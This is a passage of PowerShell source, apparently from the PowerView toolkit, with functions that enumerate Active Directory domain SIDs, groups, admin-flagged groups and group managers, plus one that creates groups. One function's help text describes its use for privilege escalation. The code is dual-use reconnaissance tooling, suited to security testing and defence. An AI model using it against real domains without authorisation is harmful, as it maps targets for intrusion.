Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainSID\n\n.EXAMPLE\n\nGet-DomainSID -Domain testlab.local\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainSID -Credential $Cred\n\n.OUTPUTS\n\nString\n\nA string representing the specified domain SID.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType([String])]\n    [CmdletBinding()]\n    Param(\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    $SearcherArguments = @{\n        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'\n    }\n    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n\n    $DCSID = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid\n\n    if ($DCSID) {\n        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))\n    }\n    else {\n        Write-Verbose \"[Get-DomainSID] Error extracting domain SID for '$Domain'\"\n    }\n}\n\n\nfunction Get-DomainGroup {\n<#\n.SYNOPSIS\n\nReturn all groups or specific group objects in AD.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Get-DomainObject, Convert-ADName, Convert-LDAPProperty  \n\n.DESCRIPTION\n\nBuilds a directory searcher object using Get-DomainSearcher, builds a custom\nLDAP filter based on targeting/filter parameters, and searches for all objects\nmatching the criteria. To only return specific properties, use\n\"-Properties samaccountname,usnchanged,...\". By default, all group objects for\nthe current domain are returned. To return the groups a specific user/group is\na part of, use -MemberIdentity X to execute token groups enumeration.\n\n.PARAMETER Identity\n\nA SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)\nspecifying the group to query for. Wildcards accepted.\n\n.PARAMETER MemberIdentity\n\nA SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)\nspecifying the user/group member to query for group membership.\n\n.PARAMETER AdminCount\n\nSwitch. Return users with '(adminCount=1)' (meaning are/were privileged).\n\n.PARAMETER GroupScope\n\nSpecifies the scope (DomainLocal, Global, or Universal) of the group(s) to search for.\nAlso accepts NotDomainLocal, NotGloba, and NotUniversal as negations.\n\n.PARAMETER GroupProperty\n\nSpecifies a specific property to search for when performing the group search.\nPossible values are Security, Distribution, CreatedBySystem, and NotCreatedBySystem.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER SecurityMasks\n\nSpecifies an option for examining security information of a directory object.\nOne of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER FindOne\n\nOnly return one result object.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.PARAMETER Raw\n\nSwitch. Return raw results instead of translating the fields into a custom PSObject.\n\n.EXAMPLE\n\nGet-DomainGroup | select samaccountname\n\nsamaccountname\n--------------\nWinRMRemoteWMIUsers__\nAdministrators\nUsers\nGuests\nPrint Operators\nBackup Operators\n...\n\n.EXAMPLE\n\nGet-DomainGroup *admin* | select distinguishedname\n\ndistinguishedname\n-----------------\nCN=Administrators,CN=Builtin,DC=testlab,DC=local\nCN=Hyper-V Administrators,CN=Builtin,DC=testlab,DC=local\nCN=Schema Admins,CN=Users,DC=testlab,DC=local\nCN=Enterprise Admins,CN=Users,DC=testlab,DC=local\nCN=Domain Admins,CN=Users,DC=testlab,DC=local\nCN=DnsAdmins,CN=Users,DC=testlab,DC=local\nCN=Server Admins,CN=Users,DC=testlab,DC=local\nCN=Desktop Admins,CN=Users,DC=testlab,DC=local\n\n.EXAMPLE\n\nGet-DomainGroup -Properties samaccountname -Identity 'S-1-5-21-890171859-3433809279-3366196753-1117' | fl\n\nsamaccountname\n--------------\nServer Admins\n\n.EXAMPLE\n\n'CN=Desktop Admins,CN=Users,DC=testlab,DC=local' | Get-DomainGroup -Server primary.testlab.local -Verbose\nVERBOSE: Get-DomainSearcher search string: LDAP://DC=testlab,DC=local\nVERBOSE: Get-DomainGroup filter string: (&(objectCategory=group)(|(distinguishedname=CN=DesktopAdmins,CN=Users,DC=testlab,DC=local)))\n\nusncreated            : 13245\ngrouptype             : -2147483646\nsamaccounttype        : 268435456\nsamaccountname        : Desktop Admins\nwhenchanged           : 8/10/2016 12:30:30 AM\nobjectsid             : S-1-5-21-890171859-3433809279-3366196753-1118\nobjectclass           : {top, group}\ncn                    : Desktop Admins\nusnchanged            : 13255\ndscorepropagationdata : 1/1/1601 12:00:00 AM\nname                  : Desktop Admins\ndistinguishedname     : CN=Desktop Admins,CN=Users,DC=testlab,DC=local\nmember                : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local\nwhencreated           : 8/10/2016 12:29:43 AM\ninstancetype          : 4\nobjectguid            : f37903ed-b333-49f4-abaa-46c65e9cca71\nobjectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=testlab,DC=local\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainGroup -Credential $Cred\n\n.EXAMPLE\n\nGet-Domain | Select-Object -Expand name\ntestlab.local\n\n'DEV\\Domain Admins' | Get-DomainGroup -Verbose -Properties distinguishedname\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: [Get-DomainGroup] Extracted domain 'dev.testlab.local' from 'DEV\\Domain Admins'\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local\nVERBOSE: [Get-DomainGroup] filter string: (&(objectCategory=group)(|(samAccountName=Domain Admins)))\n\ndistinguishedname\n-----------------\nCN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local\n\n.OUTPUTS\n\nPowerView.Group\n\nCustom PSObject with translated group property fields.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]\n    [OutputType('PowerView.Group')]\n    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]\n        [String[]]\n        $Identity,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('UserName')]\n        [String]\n        $MemberIdentity,\n\n        [Switch]\n        $AdminCount,\n\n        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]\n        [Alias('Scope')]\n        [String]\n        $GroupScope,\n\n        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]\n        [String]\n        $GroupProperty,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]\n        [String]\n        $SecurityMasks,\n\n        [Switch]\n        $Tombstone,\n\n        [Alias('ReturnOne')]\n        [Switch]\n        $FindOne,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $Raw\n    )\n\n    BEGIN {\n        $SearcherArguments = @{}\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        $GroupSearcher = Get-DomainSearcher @SearcherArguments\n    }\n\n    PROCESS {\n        if ($GroupSearcher) {\n            if ($PSBoundParameters['MemberIdentity']) {\n\n                if ($SearcherArguments['Properties']) {\n                    $OldProperties = $SearcherArguments['Properties']\n                }\n\n                $SearcherArguments['Identity'] = $MemberIdentity\n                $SearcherArguments['Raw'] = $True\n\n                Get-DomainObject @SearcherArguments | ForEach-Object {\n                    # convert the user/group to a directory entry\n                    $ObjectDirectoryEntry = $_.GetDirectoryEntry()\n\n                    # cause the cache to calculate the token groups for the user/group\n                    $ObjectDirectoryEntry.RefreshCache('tokenGroups')\n\n                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {\n                        # convert the token group sid\n                        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value\n\n                        # ignore the built in groups\n                        if ($GroupSid -notmatch '^S-1-5-32-.*') {\n                            $SearcherArguments['Identity'] = $GroupSid\n                            $SearcherArguments['Raw'] = $False\n                            if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }\n                            $Group = Get-DomainObject @SearcherArguments\n                            if ($Group) {\n                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')\n                                $Group\n                            }\n                        }\n                    }\n                }\n            }\n            else {\n                $IdentityFilter = ''\n                $Filter = ''\n                $Identity | Where-Object {$_} | ForEach-Object {\n                    $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')\n                    if ($IdentityInstance -match '^S-1-') {\n                        $IdentityFilter += \"(objectsid=$IdentityInstance)\"\n                    }\n                    elseif ($IdentityInstance -match '^CN=') {\n                        $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"\n                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {\n                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname\n                            #   and rebuild the domain searcher\n                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                            Write-Verbose \"[Get-DomainGroup] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"\n                            $SearcherArguments['Domain'] = $IdentityDomain\n                            $GroupSearcher = Get-DomainSearcher @SearcherArguments\n                            if (-not $GroupSearcher) {\n                                Write-Warning \"[Get-DomainGroup] Unable to retrieve domain searcher for '$IdentityDomain'\"\n                            }\n                        }\n                    }\n                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {\n                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\\' + $_.ToString('X2') }) -join ''\n                        $IdentityFilter += \"(objectguid=$GuidByteString)\"\n                    }\n                    elseif ($IdentityInstance.Contains('\\')) {\n                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\\28', '(').Replace('\\29', ')') | Convert-ADName -OutputType Canonical\n                        if ($ConvertedIdentityInstance) {\n                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))\n                            $GroupName = $IdentityInstance.Split('\\')[1]\n                            $IdentityFilter += \"(samAccountName=$GroupName)\"\n                            $SearcherArguments['Domain'] = $GroupDomain\n                            Write-Verbose \"[Get-DomainGroup] Extracted domain '$GroupDomain' from '$IdentityInstance'\"\n                            $GroupSearcher = Get-DomainSearcher @SearcherArguments\n                        }\n                    }\n                    else {\n                        $IdentityFilter += \"(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))\"\n                    }\n                }\n\n                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {\n                    $Filter += \"(|$IdentityFilter)\"\n                }\n\n                if ($PSBoundParameters['AdminCount']) {\n                    Write-Verbose '[Get-DomainGroup] Searching for adminCount=1'\n                    $Filter += '(admincount=1)'\n                }\n                if ($PSBoundParameters['GroupScope']) {\n                    $GroupScopeValue = $PSBoundParameters['GroupScope']\n                    $Filter = Switch ($GroupScopeValue) {\n                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }\n                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }\n                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }\n                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }\n                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }\n                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }\n                    }\n                    Write-Verbose \"[Get-DomainGroup] Searching for group scope '$GroupScopeValue'\"\n                }\n                if ($PSBoundParameters['GroupProperty']) {\n                    $GroupPropertyValue = $PSBoundParameters['GroupProperty']\n                    $Filter = Switch ($GroupPropertyValue) {\n                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }\n                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }\n                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }\n                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }\n                    }\n                    Write-Verbose \"[Get-DomainGroup] Searching for group property '$GroupPropertyValue'\"\n                }\n                if ($PSBoundParameters['LDAPFilter']) {\n                    Write-Verbose \"[Get-DomainGroup] Using additional LDAP filter: $LDAPFilter\"\n                    $Filter += \"$LDAPFilter\"\n                }\n\n                $GroupSearcher.filter = \"(&(objectCategory=group)$Filter)\"\n                Write-Verbose \"[Get-DomainGroup] filter string: $($GroupSearcher.filter)\"\n\n                if ($PSBoundParameters['FindOne']) { $Results = $GroupSearcher.FindOne() }\n                else { $Results = $GroupSearcher.FindAll() }\n                $Results | Where-Object {$_} | ForEach-Object {\n                    if ($PSBoundParameters['Raw']) {\n                        # return raw result objects\n                        $Group = $_\n                    }\n                    else {\n                        $Group = Convert-LDAPProperty -Properties $_.Properties\n                    }\n                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')\n                    $Group\n                }\n                if ($Results) {\n                    try { $Results.dispose() }\n                    catch {\n                        Write-Verbose \"[Get-DomainGroup] Error disposing of the Results object\"\n                    }\n                }\n                $GroupSearcher.dispose()\n            }\n        }\n    }\n}\n\n\nfunction New-DomainGroup {\n<#\n.SYNOPSIS\n\nCreates a new domain group (assuming appropriate permissions) and returns the group object.\n\nTODO: implement all properties that New-ADGroup implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-PrincipalContext  \n\n.DESCRIPTION\n\nFirst binds to the specified domain context using Get-PrincipalContext.\nThe bound domain context is then used to create a new\nDirectoryServices.AccountManagement.GroupPrincipal with the specified\ngroup properties.\n\n.PARAMETER SamAccountName\n\nSpecifies the Security Account Manager (SAM) account name of the group to create.\nMaximum of 256 characters. Mandatory.\n\n.PARAMETER Name\n\nSpecifies the name of the group to create. If not provided, defaults to SamAccountName.\n\n.PARAMETER DisplayName\n\nSpecifies the display name of the group to create. If not provided, defaults to SamAccountName.\n\n.PARAMETER Description\n\nSpecifies the description of the group to create.\n\n.PARAMETER Domain\n\nSpecifies the domain to use to search for user/group principals, defaults to the current domain.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nNew-DomainGroup -SamAccountName TestGroup -Description 'This is a test group.'\n\nCreates the 'TestGroup' group with the specified description.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nNew-DomainGroup -SamAccountName TestGroup -Description 'This is a test group.' -Credential $Cred\n\nCreates the 'TestGroup' group with the specified description using the specified alternate credentials.\n\n.OUTPUTS\n\nDirectoryServices.AccountManagement.GroupPrincipal\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]\n    Param(\n        [Parameter(Mandatory = $True)]\n        [ValidateLength(0, 256)]\n        [String]\n        $SamAccountName,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Name,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $DisplayName,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Description,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    $ContextArguments = @{\n        'Identity' = $SamAccountName\n    }\n    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }\n    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }\n    $Context = Get-PrincipalContext @ContextArguments\n\n    if ($Context) {\n        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)\n\n        # set all the appropriate group parameters\n        $Group.SamAccountName = $Context.Identity\n\n        if ($PSBoundParameters['Name']) {\n            $Group.Name = $Name\n        }\n        else {\n            $Group.Name = $Context.Identity\n        }\n        if ($PSBoundParameters['DisplayName']) {\n            $Group.DisplayName = $DisplayName\n        }\n        else {\n            $Group.DisplayName = $Context.Identity\n        }\n\n        if ($PSBoundParameters['Description']) {\n            $Group.Description = $Description\n        }\n\n        Write-Verbose \"[New-DomainGroup] Attempting to create group '$SamAccountName'\"\n        try {\n            $Null = $Group.Save()\n            Write-Verbose \"[New-DomainGroup] Group '$SamAccountName' successfully created\"\n            $Group\n        }\n        catch {\n            Write-Warning \"[New-DomainGroup] Error creating group '$SamAccountName' : $_\"\n        }\n    }\n}\n\n\nfunction Get-DomainManagedSecurityGroup {\n<#\n.SYNOPSIS\n\nReturns all security groups in the current (or target) domain that have a manager set.\n\nAuthor: Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>, Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainObject, Get-DomainGroup, Get-DomainObjectAcl  \n\n.DESCRIPTION\n\nAuthority to manipulate the group membership of AD security groups and distribution groups\ncan be delegated to non-administrators by setting the 'managedBy' attribute. This is typically\nused to delegate management authority to distribution groups, but Windows supports security groups\nbeing managed in the same way.\n\nThis function searches for AD groups which have a group manager set, and determines whether that\nuser can manipulate group membership. This could be a useful method of horizontal privilege\nescalation, especially if the manager can manipulate the membership of a privileged group.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainManagedSecurityGroup | Export-PowerViewCSV -NoTypeInformation group-managers.csv\n\nStore a list of all security groups with managers in group-managers.csv\n\n.OUTPUTS\n\nPowerView.ManagedSecurityGroup\n\nA custom PSObject describing the managed security group.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.ManagedSecurityGroup')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('Name')]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $SearcherArguments = @{\n            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'\n            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'\n        }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n    }\n\n    PROCESS {\n        if ($PSBoundParameters['Domain']) {\n            $SearcherArguments['Domain'] = $Domain\n            $TargetDomain = $Domain\n        }\n        else {\n            $TargetDomain = $Env:USERDNSDOMAIN\n        }\n\n        # go through the list of security groups on the domain and identify those who have a manager\n        Get-DomainGroup @SearcherArguments | ForEach-Object {\n            $SearcherArguments['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'\n            $SearcherArguments['Identity'] = $_.managedBy\n            $Null = $SearcherArguments.Remove('LDAPFilter')\n\n            # $SearcherArguments\n            # retrieve the object that the managedBy DN refers to\n            $GroupManager = Get-DomainObject @SearcherArguments\n            # Write-Host \"GroupManager: $GroupManager\"\n            $ManagedGroup = New-Object PSObject\n            $ManagedGroup | Add-Member Noteproperty 'GroupName' $_.samaccountname\n            $ManagedGroup | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname\n            $ManagedGroup | Add-Member Noteproperty 'ManagerName' $GroupManager.samaccountname\n            $ManagedGroup | Add-Member Noteproperty 'ManagerDistinguishedName' $GroupManager.distinguishedName\n\n            # determine whether the manager is a user or a group\n            if ($GroupManager.samaccounttype -eq 0x10000000) {\n                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'Group'\n            }\n            elseif ($GroupManager.samaccounttype -eq 0x30000000) {\n                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'User'\n            }\n\n            $ACLArguments = @{\n                'Identity' = $_.distinguishedname\n                'RightsFilter' = 'WriteMembers'\n            }\n            if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }\n            if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }\n            if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }\n            if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }\n            if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }\n            if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }\n\n            # # TODO: correct!\n            # # find the ACLs that relate to the ability to write to the group\n            # $xacl = Get-DomainObjectAcl @ACLArguments -Verbose\n            # # $ACLArguments\n            # # double-check that the manager\n            # if ($xacl.ObjectType -eq 'bf9679c0-0de6-11d0-a285-00aa003049e2' -and $xacl.AceType -eq 'AccessAllowed' -and ($xacl.ObjectSid -eq $GroupManager.objectsid)) {\n            #     $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' $True\n            # }\n            # else {\n            #     $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' $False\n            # }\n\n            $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'\n\n            $ManagedGroup.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')\n            $ManagedGroup\n        }\n    }\n}\n\n\nfunction Get-DomainGroupMember {\n<#\n.SYNOPSIS\n\nReturn the members of a specific domain group.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Get-DomainGroup, Get-DomainGroupMember, Convert-ADName, Get-DomainObject, ConvertFrom-SID  \n\n.DESCRIPTION\n\nBuilds a directory searcher object using Get-DomainSearcher, builds a custom\nLDAP filter based on targeting/filter parameters, and searches for the specified\ngroup matching the criteria. Each result is then rebound and the full user\nor group object is returned.\n\n.PARAMETER Identity\n\nA SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)\nspecifying the group to query for. Wildcards accepted.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER Recurse\n\nSwitch. If the group member is a group, recursively try to query its members as well.\n\n.PARAMETER RecurseUsingMatchingRule\n\nSwitch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query to recurse.\nMuch faster than manual recursion, but doesn't reveal cross-domain groups,\nand only returns user accounts (no nested group objects themselves).\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER SecurityMasks\n\nSpecifies an option for examining security information of a directory object.\nOne of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainGroupMember \"Desktop 